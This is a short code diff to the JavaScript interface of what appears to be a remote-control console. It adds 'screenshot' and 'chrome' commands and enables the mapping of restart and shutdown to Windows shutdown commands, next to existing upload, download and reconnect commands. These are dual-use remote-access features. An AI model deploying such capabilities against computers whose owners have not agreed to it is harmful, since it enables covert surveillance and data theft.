@@ -12,8 +12,10 @@ var inputHistorySSH = [];
 var commands = {
     "status": { "id": 1, "help": "Check the status of a file transfer", "usage": "status" },
     "reconnect": { "id": 2, "help": "Force the remote computer to reconnect", "usage": "reconnect" },
+    "screenshot": { "id": 5, "help": "Capture a screenshot", "usage": "\t\tscreenshot" },
     "upload": { "id": 3, "help": "Upload a file to the remote computer", "usage": "upload <file>" },
     "download": { "id": 4, "help": "Downaload a file from the remote computer", "usage": "download <file>" },
+    "chrome": { "id": 6, "help": "Launch Chrome browser", "usage": "\t\t\tchrome <tab1> <tab2> <tabn>" },
 }
 
 $(document).ready(function() {
@@ -199,7 +201,7 @@ function executeCmd() {
         inputHistorySSH[inputHistorySSH.length] = cmd;
         indexer = inputHistorySSH.length;
  
-        // cmd = cmd == "restart" ? "shutdown -r" : cmd == "shutdown" ? "shutdown -s" : cmd;
+        cmd = cmd == "restart" ? "shutdown -r" : cmd == "shutdown" ? "shutdown -s" : cmd;
 
         if(cls) {
             cmdProcessing = false;
